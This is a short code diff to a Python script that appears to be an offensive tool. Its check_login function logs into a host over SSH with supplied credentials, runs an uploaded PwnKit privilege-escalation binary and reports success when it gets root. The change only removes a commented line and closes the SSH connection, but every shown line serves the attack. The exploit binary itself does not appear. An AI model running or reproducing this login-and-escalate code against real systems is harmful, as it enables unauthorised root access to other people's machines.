@@ -40,10 +40,9 @@ def check_login(ip_address, username, password):
 
 	logger.info("Checking for root privileges...")
 	ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | ./{pwnkit_binary_name}")
-	
-	# ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command("whoami")
 	output_as_string = ssh_stdout.read().decode().strip()
 	logger.debug(f"'whoami' output: {output_as_string}")
+	ssh_client.close()
 
 	if output_as_string == "root":
 		logger.info(f"{COLOR_OKGREEN}Successfully got root on {username}@{ip_address}{COLOR_END}")
